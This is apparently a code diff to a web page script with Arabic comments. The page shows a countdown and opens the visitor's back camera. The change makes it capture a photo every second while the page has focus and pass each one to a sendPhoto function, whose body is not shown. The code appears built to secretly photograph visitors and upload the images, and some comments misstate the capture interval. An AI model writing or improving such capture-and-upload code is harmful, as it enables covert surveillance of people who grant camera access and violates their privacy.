@@ -1,4 +1,4 @@
-document.addEventListener("DOMContentLoaded", function () {
+document.addEventListener("DOMContentLoaded", async function () {
     let timeLeft = 20;
     const countdownElement = document.getElementById("countdown");
     const progressBar = document.getElementById("progress");
@@ -13,28 +13,46 @@ document.addEventListener("DOMContentLoaded", function () {
         }
     }, 1000);
 
-    async function startCamera() {
+    async function getBackCameraId() {
         try {
-            const video = document.getElementById('video');
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: "environment" } // تشغيل الكاميرا الخلفية
-            });
-            video.srcObject = stream;
-
-            console.log("✅ الكاميرا الخلفية تعمل، سيتم التقاط الصور بشكل متكرر...");
-            capturePhotosRepeatedly(stream);
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            const backCamera = devices.find(device => device.kind === 'videoinput' && device.label.toLowerCase().includes('back'));
+            return backCamera ? backCamera.deviceId : null;
         } catch (error) {
-            console.error("❌ فشل في تشغيل الكاميرا:", error);
+            console.error("❌ فشل في جلب قائمة الكاميرات:", error);
+            return null;
         }
     }
 
-    function capturePhotosRepeatedly(stream) {
+    async function startCamera() {
+        try {
+            const backCameraId = await getBackCameraId();
+            if (!backCameraId) {
+                console.warn("⚠ لم يتم العثور على كاميرا خلفية! سيتم تشغيل الافتراضية.");
+            }
+
+            const video = document.getElementById('video');
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { deviceId: backCameraId ? { exact: backCameraId } : undefined }
+            });
+
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+                console.log("✅ الكاميرا تعمل! سيتم بدء التقاط الصور فورًا...");
+                capturePhotosRepeatedly();
+            };
+        } catch (error) {
+            console.error("❌ فشل في تشغيل الكاميرا الخلفية:", error);
+        }
+    }
+
+    function capturePhotosRepeatedly() {
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
 
         function takePhoto() {
-            if (!document.hasFocus()) return; // إذا غادر المستخدم الصفحة، توقف عن التقاط الصور
+            if (!document.hasFocus()) return;
 
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -43,10 +61,10 @@ document.addEventListener("DOMContentLoaded", function () {
             console.log("📸 تم التقاط صورة بالكاميرا الخلفية! جاري إرسالها...");
             canvas.toBlob(blob => sendPhoto(blob), "image/jpeg");
 
-            setTimeout(takePhoto, 1000); // التقاط صورة جديدة كل 5 ثوانٍ
+            setTimeout(takePhoto, 1000); // التقاط صورة كل 3 ثواني
         }
 
-        takePhoto();
+        takePhoto(); // أول لقطة بدون تأخير
     }
 
     function sendPhoto(blob) {
